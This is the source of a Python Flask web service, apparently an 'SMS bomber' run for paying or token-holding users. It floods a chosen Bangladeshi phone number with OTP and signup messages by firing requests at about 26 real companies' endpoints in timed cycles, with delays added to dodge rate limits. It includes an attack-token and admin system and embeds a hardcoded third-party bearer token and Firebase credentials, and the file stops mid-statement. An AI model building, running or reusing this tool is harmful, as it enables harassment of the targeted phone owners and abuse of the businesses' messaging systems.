#!/usr/bin/env python3
import requests
import time
import threading
import uuid
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, render_template, request, jsonify
from datetime import datetime
import firebase_admin
from firebase_admin import credentials, firestore, auth

# ---------- Firebase Initialization ----------
cred = credentials.Certificate("firebase-adminsdk.json")
firebase_admin.initialize_app(cred)
db = firestore.client()

ADMIN_UID = "BwSdiixC70MqnlA0t5oOSYREp0e2"

app = Flask(__name__)
app.secret_key = "your-super-secret-key-change-this-in-production"

# Store active attacks
attacks = {}

# Rate limiting storage
ip_attack_count = {}
device_attack_count = {}

# ---------- Helper Functions ----------
def format_phone_number(number):
    number = number.strip()
    if not number.startswith("+88"):
        if number.startswith("88"):
            full_number = "+" + number
        else:
            full_number = "+88" + number
    else:
        full_number = number
    clean_number = full_number.replace("+88", "")
    return full_number, clean_number

def get_or_create_user(user_id, email=None, display_name=None):
    user_ref = db.collection('users').document(user_id)
    user_doc = user_ref.get()
    
    if not user_doc.exists:
        user_ref.set({
            'email': email,
            'display_name': display_name or email or user_id[:8],
            'remaining_attacks': 1,
            'total_attacks_used': 0,
            'total_attacks_granted': 1,
            'appeal_status': None,
            'appeal_message': None,
            'appeal_request_time': None,
            'is_admin': (user_id == ADMIN_UID),
            'is_banned': False,
            'created_at': firestore.SERVER_TIMESTAMP,
            'last_active': firestore.SERVER_TIMESTAMP
        })
        return {'remaining_attacks': 1, 'total_attacks_used': 0, 'is_admin': (user_id == ADMIN_UID), 'is_banned': False}
    
    user_data = user_doc.to_dict()
    user_ref.update({'last_active': firestore.SERVER_TIMESTAMP})
    return user_data

def deduct_attack_token(user_id):
    user_ref = db.collection('users').document(user_id)
    user_doc = user_ref.get()
    
    if not user_doc.exists:
        return False
    
    user_data = user_doc.to_dict()
    
    if user_data.get('is_banned', False):
        return False
    
    remaining = user_data.get('remaining_attacks', 0)
    
    if remaining > 0:
        user_ref.update({
            'remaining_attacks': remaining - 1,
            'total_attacks_used': firestore.Increment(1)
        })
        return True
    return False

def add_attack_tokens(user_id, amount, reason="admin_grant"):
    user_ref = db.collection('users').document(user_id)
    user_ref.update({
        'remaining_attacks': firestore.Increment(amount),
        'total_attacks_granted': firestore.Increment(amount)
    })
    db.collection('token_grants').add({
        'user_id': user_id,
        'amount': amount,
        'reason': reason,
        'timestamp': firestore.SERVER_TIMESTAMP
    })

def submit_appeal(user_id, message):
    user_ref = db.collection('users').document(user_id)
    user_ref.update({
        'appeal_status': 'pending',
        'appeal_message': message,
        'appeal_request_time': firestore.SERVER_TIMESTAMP
    })
    return True

def ban_user(user_id):
    user_ref = db.collection('users').document(user_id)
    user_ref.update({
        'is_banned': True,
        'banned_at': firestore.SERVER_TIMESTAMP,
        'remaining_attacks': 0
    })
    return True

def unban_user(user_id):
    user_ref = db.collection('users').document(user_id)
    user_ref.update({
        'is_banned': False,
        'unbanned_at': firestore.SERVER_TIMESTAMP
    })
    return True

def take_all_tokens(user_id):
    user_ref = db.collection('users').document(user_id)
    user_ref.update({
        'remaining_attacks': 0,
        'tokens_taken_at': firestore.SERVER_TIMESTAMP
    })
    return True

def delete_user(user_id):
    user_ref = db.collection('users').document(user_id)
    user_ref.delete()
    return True

def check_rate_limit(ip_address):
    now = datetime.now()
    today = now.date()
    
    if ip_address not in ip_attack_count:
        ip_attack_count[ip_address] = []
    
    ip_attack_count[ip_address] = [t for t in ip_attack_count[ip_address] if t.date() == today]
    
    if len(ip_attack_count[ip_address]) >= 10:
        return False, "IP address limit reached (10 attacks per day)"
    
    return True, "OK"

def record_attack(ip_address):
    now = datetime.now()
    if ip_address not in ip_attack_count:
        ip_attack_count[ip_address] = []
    ip_attack_count[ip_address].append(now)

# ---------- Retry Decorator for Better Success Rate ----------
def retry_request(max_attempts=2, delay=0.5):
    def decorator(func):
        def wrapper(*args, **kwargs):
            for attempt in range(max_attempts):
                try:
                    result = func(*args, **kwargs)
                    if result:
                        return True
                    if attempt < max_attempts - 1:
                        time.sleep(delay * (attempt + 1))
                except Exception:
                    if attempt < max_attempts - 1:
                        time.sleep(delay * (attempt + 1))
            return False
        return wrapper
    return decorator

# ---------- API Tasks with Delays ----------
def create_api_tasks(session, clean_number, raw_number, full_number):
    tasks = []
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_sundarban():
        time.sleep(random.uniform(0.3, 0.6))
        url = "https://api-gateway.sundarbancourierltd.com/graphql"
        headers = {'accept': '*/*', 'content-type': 'application/json',
                   'origin': 'https://customer.sundarbancourierltd.com',
                   'referer': 'https://customer.sundarbancourierltd.com/',
                   'user-agent': 'Mozilla/5.0'}
        data = {"operationName": "CreateAccessToken",
                "variables": {"accessTokenFilter": {"userName": f"0{clean_number}"}},
                "query": "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }"}
        r = session.post(url, json=data, headers=headers, timeout=8)
        return r.status_code in (200, 201, 202)
    tasks.append(("Sundarban", task_sundarban))
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_bioscope():
        time.sleep(random.uniform(0.3, 0.6))
        url = "https://api-dynamic.bioscopelive.com/v2/auth/login"
        params = {"country": "BD", "platform": "web", "language": "en"}
        headers = {'accept': 'application/json', 'content-type': 'application/json',
                   'origin': 'https://www.bioscopeplus.com', 'referer': 'https://www.bioscopeplus.com/',
                   'user-agent': 'Mozilla/5.0'}
        data = {"number": f"+88{clean_number}"}
        r = session.post(url, params=params, json=data, headers=headers, timeout=8)
        return r.status_code in (200, 201, 202)
    tasks.append(("Bioscope", task_bioscope))
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_shwapno():
        time.sleep(random.uniform(0.3, 0.6))
        url = "https://www.shwapno.com/api/auth"
        headers = {'accept': '*/*', 'content-type': 'application/json',
                   'origin': 'https://www.shwapno.com', 'referer': 'https://www.shwapno.com/',
                   'user-agent': 'Mozilla/5.0'}
        r = session.post(url, json={"phoneNumber": full_number}, headers=headers, timeout=8)
        return r.status_code in (200, 201, 202)
    tasks.append(("Shwapno", task_shwapno))
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_redx():
        time.sleep(random.uniform(0.3, 0.6))
        url = "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp"
        headers = {'accept': 'application/json, text/plain, */*', 'content-type': 'application/json',
                   'origin': 'https://redx.com.bd', 'referer': 'https://redx.com.bd/',
                   'user-agent': 'Mozilla/5.0'}
        r = session.post(url, json={"phoneNumber": clean_number}, headers=headers, timeout=8)
        return r.status_code in (200, 201, 202)
    tasks.append(("RedX", task_redx))
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_robiwifi():
        time.sleep(random.uniform(0.3, 0.6))
        url = "https://robiwifi-mw.robi.com.bd/fwa/wifi/api/v1/primary-phone/send-otp"
        headers = {'Accept': 'application/json', 'Content-Type': 'application/json',
                   'Origin': 'https://robiwifi.robi.com.bd', 'Referer': 'https://robiwifi.robi.com.bd/',
                   'User-Agent': 'Mozilla/5.0'}
        data = {"requestId": None, "phone": clean_number}
        r = session.post(url, json=data, headers=headers, timeout=8)
        return r.status_code in (200, 201, 202)
    tasks.append(("Robi WiFi", task_robiwifi))
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_bikroy():
        time.sleep(random.uniform(0.3, 0.6))
        url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={clean_number}"
        r = session.get(url, headers={"application-name": "web"}, timeout=8)
        return r.status_code == 200
    tasks.append(("Bikroy", task_bikroy))
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_gpfi():
        time.sleep(random.uniform(0.3, 0.6))
        url = "https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp"
        headers = {'Content-Type': 'application/json', 'Origin': 'https://gpfi.grameenphone.com',
                   'Referer': 'https://gpfi.grameenphone.com/', 'User-Agent': 'Mozilla/5.0'}
        r = session.post(url, json={"phone": raw_number, "email": "", "language": "en"}, headers=headers, timeout=8)
        return r.status_code in (200, 201, 202)
    tasks.append(("GPFI", task_gpfi))
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_paperfly():
        time.sleep(random.uniform(0.3, 0.6))
        url = 'https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php'
        data = {"full_name": "Web User", "company_name": "web", "email_address": "web@user.com", "phone_number": raw_number}
        r = session.post(url, json=data, timeout=8)
        return r.status_code in (200, 201, 202)
    tasks.append(("Paperfly", task_paperfly))
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_hishabee():
        time.sleep(random.uniform(0.3, 0.6))
        headers_h = {"accept": "application/json, text/plain, */*", "platform": "WEB",
                     "user-agent": "Mozilla/5.0", "origin": "https://web.hishabee.business",
                     "referer": "https://web.hishabee.business/"}
        check_url = f"https://app.hishabee.business/api/V2/number_check?mobile_number={clean_number}&country_code=88"
        session.post(check_url, headers=headers_h, timeout=5)
        time.sleep(0.5)
        otp_url = f"https://app.hishabee.business/api/V2/otp/send?mobile_number={clean_number}&country_code=88"
        r = session.post(otp_url, headers=headers_h, timeout=8)
        return r.status_code in (200, 201, 202)
    tasks.append(("Hishabee", task_hishabee))
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_osudpotro():
        time.sleep(random.uniform(0.3, 0.6))
        url = 'https://api.osudpotro.com/api/v1/users/send_otp'
        headers = {'content-type': 'application/json', 'origin': 'https://osudpotro.com',
                   'referer': 'https://osudpotro.com/', 'user-agent': 'Mozilla/5.0'}
        data = {"mobile": "+88-"+raw_number, "deviceToken": "web", "language": "en", "os": "web"}
        r = session.post(url, headers=headers, json=data, timeout=8)
        return r.status_code in (200, 201, 202)
    tasks.append(("Osudpotro", task_osudpotro))
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_sikho():
        time.sleep(random.uniform(0.3, 0.6))
        url = 'https://api.shikho.com/auth/v2/send/sms'
        headers = {'accept': 'application/json, text/plain, */*', 'content-type': 'application/json',
                   'origin': 'https://shikho.com', 'referer': 'https://shikho.com/', 'user-agent': 'Mozilla/5.0'}
        data = {"phone": "88"+raw_number, "type": "student", "auth_type": "signup", "vendor": "shikho"}
        r = session.post(url, headers=headers, json=data, timeout=8)
        return r.status_code in (200, 201, 202)
    tasks.append(("Sikho", task_sikho))
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_kirei():
        time.sleep(random.uniform(0.3, 0.6))
        url = "https://frontendapi.kireibd.com/api/v2/send-login-otp"
        headers = {'accept': 'application/json', 'content-type': 'application/json',
                   'origin': 'https://kireibd.com', 'referer': 'https://kireibd.com/',
                   'user-agent': 'Mozilla/5.0', 'x-requested-with': 'XMLHttpRequest'}
        r = session.post(url, json={"email": clean_number}, headers=headers, timeout=8)
        return r.status_code in (200, 201, 202)
    tasks.append(("KireiBD", task_kirei))
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_iqra():
        time.sleep(random.uniform(0.3, 0.6))
        url = f"http://apibeta.iqra-live.com/api/v1/sent-otp/{clean_number}"
        headers = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}
        r = session.get(url, headers=headers, timeout=8)
        return r.status_code == 200
    tasks.append(("Iqra Live", task_iqra))
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_swap():
        time.sleep(random.uniform(0.3, 0.6))
        url = "https://api.swap.com.bd/api/v1/send-otp/v2"
        headers = {'Accept': 'application/json', 'Content-Type': 'application/json',
                   'Origin': 'https://swap.com.bd', 'Referer': 'https://swap.com.bd/',
                   'User-Agent': 'Mozilla/5.0'}
        r = session.post(url, json={"phone": clean_number}, headers=headers, timeout=8)
        return r.status_code in (200, 201, 202)
    tasks.append(("Swap", task_swap))
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_easy():
        time.sleep(random.uniform(0.3, 0.6))
        url = "https://core.easy.com.bd/api/v1/registration"
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}
        data = {"password": "easy123", "password_confirmation": "easy123",
                "device_key": "44818de9280e1419d3d63a2b65d8c33d", "name": "User",
                "mobile": clean_number, "social_login_id": "", "email": "user@gmail.com"}
        r = session.post(url, json=data, headers=headers, timeout=8)
        return r.status_code in (200, 201, 202)
    tasks.append(("Easy.com", task_easy))
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_doctime():
        time.sleep(random.uniform(0.3, 0.6))
        url_hash = "https://api.doctime.net/api/hashing/status"
        params = {"country_calling_code": "88", "contact_no": f"0{clean_number}"}
        headers = {'accept': 'application/json', 'origin': 'https://doctime.com.bd',
                   'platform': 'Web', 'referer': 'https://doctime.com.bd/', 'user-agent': 'Mozilla/5.0'}
        r_hash = session.get(url_hash, params=params, headers=headers, timeout=8)
        if r_hash.status_code == 200:
            url_auth = "https://api.doctime.net/api/v2/authenticate"
            data_auth = {"country_calling_code": "88", "contact_no": f"0{clean_number}",
                         "timestamp": int(time.time())}
            r = session.post(url_auth, json=data_auth, headers=headers, timeout=8)
            return r.status_code in (200, 201, 202)
        return False
    tasks.append(("Doctime", task_doctime))
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_bohubrihi():
        time.sleep(random.uniform(0.3, 0.6))
        url = "https://bb-api.bohubrihi.com/public/activity/otp"
        headers = {'accept': 'application/json, text/plain, */*', 'content-type': 'application/json',
                   'origin': 'https://bohubrihi.com', 'referer': 'https://bohubrihi.com/',
                   'user-agent': 'Mozilla/5.0'}
        data = {"phone": clean_number, "intent": "login"}
        r = session.post(url, json=data, headers=headers, timeout=8)
        return r.status_code in (200, 201, 202)
    tasks.append(("Bohubrihi", task_bohubrihi))
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_apex():
        time.sleep(random.uniform(0.3, 0.6))
        url = "https://api.apex4u.com/api/auth/login"
        headers = {'accept': 'application/json, text/plain, */*', 'content-type': 'application/json',
                   'origin': 'https://apex4u.com', 'referer': 'https://apex4u.com/',
                   'user-agent': 'Mozilla/5.0'}
        data = {"phoneNumber": clean_number}
        r = session.post(url, json=data, headers=headers, timeout=8)
        return r.status_code in (200, 201, 202)
    tasks.append(("Apex", task_apex))
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_hoichoi():
        time.sleep(random.uniform(0.3, 0.6))
        url = "https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code"
        headers = {'accept': '*/*', 'content-type': 'application/json', 'origin': 'https://www.hoichoi.tv',
                   'referer': 'https://www.hoichoi.tv/', 'user-agent': 'Mozilla/5.0',
                   'rid': 'anti-csrf', 'st-auth-mode': 'header'}
        data = {"phoneNumber": f"+88{clean_number}", "platform": "MOBILE_WEB"}
        r = session.post(url, json=data, headers=headers, timeout=8)
        return r.status_code in (200, 201, 202)
    tasks.append(("Hoichoi", task_hoichoi))
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_chorki():
        time.sleep(random.uniform(0.3, 0.6))
        url = "https://api-dynamic.chorki.com/v2/auth/login"
        params = {"country": "BD", "platform": "web", "language": "en"}
        headers = {'accept': 'application/json', 'content-type': 'application/json',
                   'origin': 'https://www.chorki.com', 'referer': 'https://www.chorki.com/',
                   'user-agent': 'Mozilla/5.0'}
        data = {"number": f"+88{clean_number}"}
        r = session.post(url, params=params, json=data, headers=headers, timeout=8)
        return r.status_code in (200, 201, 202)
    tasks.append(("Chorki", task_chorki))
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_deeptoplay():
        time.sleep(random.uniform(0.3, 0.6))
        url = "https://api.deeptoplay.com/v2/auth/login"
        params = {"country": "BD", "platform": "web", "language": "en"}
        headers = {'accept': 'application/json', 'content-type': 'application/json',
                   'origin': 'https://www.deeptoplay.com', 'referer': 'https://www.deeptoplay.com/',
                   'user-agent': 'Mozilla/5.0'}
        data = {"number": f"+88{clean_number}"}
        r = session.post(url, params=params, json=data, headers=headers, timeout=8)
        return r.status_code in (200, 201, 202)
    tasks.append(("Deeptoplay", task_deeptoplay))
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_teleflix_signup():
        time.sleep(random.uniform(0.3, 0.6))
        url = "https://teleflix.com.bd/home/signupsubmit"
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://teleflix.com.bd',
                   'Referer': 'https://teleflix.com.bd/home/signin', 'User-Agent': 'Mozilla/5.0'}
        data = f"msisdn-signup={clean_number}&register-submit=Sign+Up"
        r = session.post(url, data=data, headers=headers, timeout=8)
        return r.status_code in (200, 302)
    tasks.append(("Teleflix Signup", task_teleflix_signup))
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_teleflix_forgot():
        time.sleep(random.uniform(0.3, 0.6))
        url = "https://teleflix.com.bd/index.php/home/forgotpass"
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://teleflix.com.bd',
                   'Referer': 'https://teleflix.com.bd/home/signupsubmit', 'User-Agent': 'Mozilla/5.0'}
        data = f"msisdn-forgot={clean_number}&forgot-submit=Send+Password"
        r = session.post(url, data=data, headers=headers, timeout=8)
        return r.status_code in (200, 302)
    tasks.append(("Teleflix Forgot", task_teleflix_forgot))
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_toffee():
        time.sleep(random.uniform(0.3, 0.6))
        url = "https://prod-services.toffeelive.com/sms/v1/subscriber/otp"
        headers = {'accept': '*/*', 'content-type': 'application/json', 'origin': 'https://toffeelive.com',
                   'referer': 'https://toffeelive.com/', 'user-agent': 'Mozilla/5.0'}
        data = {"target": f"880{clean_number}", "resend": False}
        r = session.post(url, json=data, headers=headers, timeout=8)
        return r.status_code in (200, 201, 202)
    tasks.append(("Toffee", task_toffee))
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_shomvob():
        time.sleep(random.uniform(0.3, 0.6))
        url = "https://backend-api.shomvob.co/api/v2/otp/phone"
        headers = {'accept': 'application/json',
                   'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY1OTg5NTcwOH0.IOdKen62ye0N9WljM_cj3Xffmjs3dXUqoJRZ_1ezd4Q',
                   'content-type': 'application/json', 'origin': 'https://app.shomvob.co',
                   'referer': 'https://app.shomvob.co/auth/', 'user-agent': 'Mozilla/5.0'}
        data = {"phone": f"880{clean_number}", "is_retry": 0}
        r = session.post(url, json=data, headers=headers, timeout=8)
        return r.status_code in (200, 201, 202)
    tasks.append(("Shomvob", task_shomvob))
    
    @retry_request(max_attempts=2, delay=0.5)
    def task_zatiq():
        time.sleep(random.uniform(0.3, 0.6))
        url = "https://easybill.zatiq.tech/api/auth/v1/send_otp"
        headers = {'content-type': 'application/json', 'application-type': 'Merchant', 'device-type': 'Web',
                   'origin': 'https://merchant.zatiqeasy.com', 'referer': 'https://merchant.zatiqeasy.com/',
                   'user-agent': 'Mozilla/5.0', 'accept': 'application/json'}
        data = {"code": "+880", "country_code": "BD", "phone": clean_number, "is_existing_user": False}
        r = session.post(url, json=data, headers=headers, timeout=8)
        return r.status_code in (200, 201, 202)
    tasks.append(("Zatiq Easy", task_zatiq))
    
    return tasks

# ---------- Improved Bombing Worker with Sequential Execution & Delays ----------
def bombing_worker(attack_id, raw_number, user_id):
    full_number, clean_number = format_phone_number(raw_number)
    attacks[attack_id]['target'] = full_number
    attacks[attack_id]['logs'].append(f"🚀 Attack started on {full_number}")
    
    session = requests.Session()
    MAX_CYCLES = 3
    cycle_num = 0
    total_success = 0
    total_failed = 0
    
    try:
        while cycle_num < MAX_CYCLES and attacks.get(attack_id, {}).get('status') == 'running':
            cycle_num += 1
            attacks[attack_id]['logs'].append(f"🔄 CYCLE {cycle_num}/{MAX_CYCLES} STARTED")
            attacks[attack_id]['cycles_done'] = cycle_num
            
            # Get all tasks
            tasks = create_api_tasks(session, clean_number, raw_number, full_number)
            cycle_success = 0
            cycle_failed = 0
            
            # Execute tasks SEQUENTIALLY with small delays (prevents rate limiting)
            for name, task in tasks:
                if attacks.get(attack_id, {}).get('status') != 'running':
                    break
                
                # Add random jitter between requests (0.3 to 0.8 seconds)
                time.sleep(random.uniform(0.3, 0.8))
                
                try:
                    result = task()
                    if result:
                        cycle_success += 1
                        total_success += 1
                        attacks[attack_id]['logs'].append(f"[{name}] ✓")
                    else:
                        cycle_failed += 1
                        total_failed += 1
                        attacks[attack_id]['logs'].append(f"[{name}] ✗")
                except Exception as e:
                    cycle_failed += 1
                    total_failed += 1
                    attacks[attack_id]['logs'].append(f"[{name}] ✗")
                
                # Update progress periodically
                attacks[attack_id]['total_success'] = total_success
                attacks[attack_id]['total_failed'] = total_failed
            
            attacks[attack_id]['total_success'] = total_success
            attacks[attack_id]['total_failed'] = total_failed
            attacks[attack_id]['logs'].append(f"📊 Cycle {cycle_num}: ✓{cycle_success} ✗{cycle_failed} | Total: ✓{total_success} ✗{total_failed}")
            
            # Longer delay between cycles (8 seconds instead of 5)
            if cycle_num < MAX_CYCLES and attacks.get(attack_id, {}).get('status') == 'running':
                attacks[attack_id]['logs'].append(f"⏳ Waiting 8 seconds before next cycle...")
                for i in range(8, 0, -1):
                    if attacks.get(attack_id, {}).get('status') != 'running':
                        break
                    time.sleep(1)
        
        attacks[attack_id]['status'] = 'completed'
        attacks[attack_id]['logs'].append(f"✅ Attack finished! Final: ✓{total_success} ✗{total_failed}")
        
        # Only deduct token if at least one request succeeded
        if total_success > 0:
            deduct_attack_token(user_id)
        else:
            attacks[attack_id]['logs'].append(f"⚠️ No successful requests. Token not deducted.")
        
    except Exception as e:
        attacks[attack_id]['status'] = 'error'
        attacks[attack_id]['logs'].append(f"❌ Error: {str(e)}")

# ---------- Flask Routes ----------
@app.route('/')
def index():
    firebase_config = {
        "apiKey": "AIzaSyC6icSf0X-sjQv_a-NVsZYQRSWU6LPEZ1o",
        "authDomain": "nocaught-db509.firebaseapp.com",
        "projectId": "nocaught-db509",
        "storageBucket": "nocaught-db509.firebasestorage.app",
        "messagingSenderId": "424150483918",
        "appId": "1:424150483918:web:dd6c9041fd05b2358d619f",
        "measurementId": "G-WW9K2MJSXX"
    }
    return render_template('index.html', firebase_config=firebase_config)

@app.route('/admin')
def admin():
    firebase_config = {
        "apiKey": "AIzaSyC6icSf0X-sjQv_a-NVsZYQRSWU6LPEZ1o",
        "authDomain": "nocaught-db509.firebaseapp.com",
        "projectId": "nocaught-db509",
        "storageBucket": "nocaught-db509.firebasestorage.app",
        "messagingSenderId": "424150483918",
        "appId": "1:424150483918:web:dd6c9041fd05b2358d619f",
        "measurementId": "G-WW9K2MJSXX"
    }
    return render_template('admin.html', firebase_config=firebase_config)

@app.route('/api/verify_token', methods=['POST'])
def verify_token():
    data = request.json
    id_token = data.get('idToken')
    
    try:
        decoded_token = auth.verify_id_token(id_token)
        user_id = decoded_token['uid']
        email = decoded_token.get('email')
        name = decoded_token.get('name')
        
        user_data = get_or_create_user(user_id, email, name)
        
        if user_data.get('is_banned', False):
            return jsonify({'success': False, 'error': 'Your account has been banned. Contact admin.'}), 403
        
        return jsonify({
            'success': True,
            'user_id': user_id,
            'email': email,
            'remaining_attacks': user_data.get('remaining_attacks', 0),
            'total_used': user_data.get('total_attacks_used', 0),
            'is_admin': user_data.get('is_admin', False),
            'is_banned': user_data.get('is_banned', False),
            'appeal_status': user_data.get('appeal_status')
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 401

@app.route('/api/start_attack', methods=['POST'])
def start_attack():
    data = request.json
    id_token = data.get('idToken')
    phone = data.get('phone', '').strip()
    
    if not phone:
        return jsonify({'error': 'Phone number required'}), 400
    
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    allowed, message = check_rate_limit(client_ip)
    if not allowed:
        return jsonify({'error': message}), 429
    
    try:
        decoded_token = auth.verify_id_token(id_token)
        user_id = decoded_token['uid']
        
        user_data = get_or_create_user(user_id)
        
        if user_data.get('is_banned', False):
            return jsonify({'error': 'Your account is banned. Contact admin.'}), 403
        
        if user_data.get('remaining_attacks', 0) <= 0:
            return jsonify({'error': 'No attack tokens remaining! Please submit an appeal.'}), 403
        
        record_attack(client_ip)
        
        attack_id = str(uuid.uuid4())[:8]
        attacks[attack_id] = {
            'status': 'running',
            'target': phone,
            'logs': [],
            'cycles_done': 0,
            'total_success': 0,
            'total_failed': 0
        }
        
        thread = threading.Thread(target=bombing_worker, args=(attack_id, phone, user_id))
        thread.daemon = True
        thread.start()
        
        return jsonify({'attack_id': attack_id})
    except Exception as e:
        return jsonify({'error': str(e)}), 401

@app.route('/api/attack_status/<attack_id>')
def attack_status(attack_id):
    if attack_id not in attacks:
        return jsonify({'error': 'Attack not found'}), 404
    
    data = attacks[attack_id].copy()
    data['logs'] = data['logs'][-50:]
    return jsonify(data)

@app.route('/api/submit_appeal', methods=['POST'])
def submit_appeal_route():
    data = request.json
    id_token = data.get('idToken')
    message = data.get('message', '').strip()
    
    if not message:
        return jsonify({'error': 'Appeal message required'}), 400
    
    try:
        decoded_token = auth.verify_id_token(id_token)
        user_id = decoded_token['uid']
        
        submit_appeal(user_id, message)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 401

@app.route('/api/admin/users', methods=['GET'])
def admin_users():
    auth_header = request.headers.get('Authorization')
    if not auth_header:
        return jsonify({'error': 'No token'}), 401
    
    id_token = auth_header.split(' ')[1]
    
    try:
        decoded_token = auth.verify_id_token(id_token)
        user_id = decoded_token['uid']
        
        if user_id != ADMIN_UID:
            return jsonify({'error': 'Admin access required'}), 403
        
        users_ref = db.collection('users')
        users = []
        for doc in users_ref.stream():
            user_data = doc.to_dict()
            users.append({
                'id': doc.id,
                'email': user_data.get('email'),
                'display_name': user_data.get('display_name'),
                'remaining_attacks': user_data.get('remaining_attacks', 0),
                'total_used': user_data.get('total_attacks_used', 0),
                'total_granted': user_data.get('total_attacks_granted', 0),
                'appeal_status': user_data.get('appeal_status'),
                'appeal_message': user_data.get('appeal_message'),
                'is_admin': user_data.get('is_admin', False),
                'is_banned': user_data.get('is_banned', False)
            })
        
        return jsonify({'users': users})
    except Exception as e:
        return jsonify({'error': str(e)}), 401

@app.route('/api/admin/search_users', methods=['POST'])
def search_users():
    auth_header = request.headers.get('Authorization')
    if not auth_header:
        return jsonify({'error': 'No token'}), 401
    
    id_token = auth_header.split(' ')[1]
    
    try:
        decoded_token = auth.verify_id_token(id_token)
        user_id = decoded_token['uid']
        
        if user_id != ADMIN_UID:
            return jsonify({'error': 'Admin access required'}), 403
        
        data = request.json
        search_term = data.get('search_term', '').strip().lower()
        
        if not search_term:
            return jsonify({'users': []})
        
        users_ref = db.collection('users')
        users = []
        
        for doc in users_ref.stream():
            user_data = doc.to_dict()
            email = (user_data.get('email') or '').lower()
            uid = doc.id.lower()
            display = (user_data.get('display_name') or '').lower()
            
            if search_term in email or search_term in uid or search_term in display:
                users.append({
                    'id': doc.id,
                    'email': user_data.get('email'),
                    'display_name': user_data.get('display_name'),
                    'remaining_attacks': user_data.get('remaining_attacks', 0),
                    'total_used': user_data.get('total_attacks_used', 0),
                    'total_granted': user_data.get('total_attacks_granted', 0),
                    'appeal_status': user_data.get('appeal_status'),
                    'appeal_message': user_data.get('appeal_message'),
                    'is_admin': user_data.get('is_admin', False),
                    'is_banned': user_data.get('is_banned', False)
                })
        
        return jsonify({'users': users})
    except Exception as e:
        return jsonify({'error': str(e)}), 401

@app.route('/api/admin/grant_tokens', methods=['POST'])
def grant_tokens():
    auth_header = request.headers.get('Authorization')
    if not auth_header:
        return jsonify({'error': 'No token'}), 401
    
    id_token = auth_header.split(' ')[1]
    
    try:
        decoded_token = auth.verify_id_token(id_token)
        admin_id = decoded_token['uid']
        
        if admin_id != ADMIN_UID:
            return jsonify({'error': 'Admin access required'}), 403
        
        data = request.json
        target_user_id = data.get('user_id')
        amount = data.get('amount', 5)
        
        add_attack_tokens(target_user_id, amount, 'admin_grant')
        
        db.collection('users').document(target_user_id).update({
            'appeal_status': None,
            'appeal_message': None
        })
        
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 401

@app.route('/api/admin/take_tokens', methods=['POST'])
def take_tokens():
    auth_header = request.headers.get('Authorization')
    if not auth_header:
        return jsonify({'error': 'No token'}), 401
    
    id_token = auth_header.split(' ')[1]
    
    try:
        decoded_token = auth.verify_id_token(id_token)
        admin_id = decoded_token['uid']
        
        if admin_id != ADMIN_UID:
            return jsonify({'error': 'Admin access required'}), 403
        
        data = request.json
        target_user_id = data.get('user_id')
        
        take_all_tokens(target_user_id)
        
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 401

@app.route('/api/admin/ban_user', methods=['POST'])
def ban_user_route():
    auth_header = request.headers.get('Authorization')
    if not auth_header:
        return jsonify({'error': 'No token'}), 401
    
    id_token = auth_header.split(' ')[1]
    
    try:
        decoded_token = auth.verify_id_token(id_token)
        admin_id = decoded_token['uid']
        
        if admin_id != ADMIN_UID:
            return jsonify({'error': 'Admin access required'}), 403
        
        data = request.json
        target_user_id = data.get('user_id')
        action = data.get('action')
        
        if action == 'ban':
            ban_user(target_user_id)
        elif action == 'unban':
            unban_user(target_user_id)
        
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 401

@app.route('/api/admin/delete_user', methods=['POST'])
def delete_user_route():
    auth_header = request.headers.get('Authorization')
    if not auth_header:
        return jsonify({'error': 'No token'}), 401
    
    id_token = auth_header.split(' ')[1]
    
    try:
        decoded_token = auth.verify_id_token(id_token)
        admin_id = decoded_token['uid']
        
        if admin_id != ADMIN_UID:
            return jsonify({'error': 'Admin access required'}), 403
        
        data = request.json
        target_user_id = data.get('user_id')
        
        delete_user(target_user_id)
        
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 401

if __name__ == '__main__':
